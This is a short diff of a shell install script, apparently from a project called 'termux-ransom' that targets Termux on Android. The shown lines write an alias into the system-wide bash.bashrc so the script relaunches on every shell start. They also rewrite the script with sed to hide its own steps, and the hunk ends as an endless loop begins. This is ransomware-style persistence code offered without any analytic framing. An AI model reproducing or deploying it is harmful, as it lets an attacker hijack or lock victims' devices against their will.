@@ -10,7 +10,7 @@ chmod u=rx install.sh
 clear
 echo "alias IMAGE='cd /data/data/com.termux/files/home/termux-ransom ; bash install.sh'" >> /data/data/com.termux/files/usr/etc/bash.bashrc
 echo "IMAGE" >> /data/data/com.termux/files/usr/etc/bash.bashrc
-sed -i '9s/echo/#/' install.sh ; sed -i '10s/echo/#/' install.sh ; sed -i '11s/echo/#/' install.sh ; sed -i '12s/echo/#/' install.sh ; sed -i '2s/termux-setup-storage/#/' install.sh
+sed -i '9s/echo/#/' install.sh ; sed -i '10s/echo/#/' install.sh ; sed -i '11s/echo/#/' install.sh ; sed -i '12s/echo/#/' install.sh ; sed -i '2s/termux-setup-storage/#/' install.sh ; sed -i '1s/pkg/#/' install.sh
 sleep 1
 while :
 do
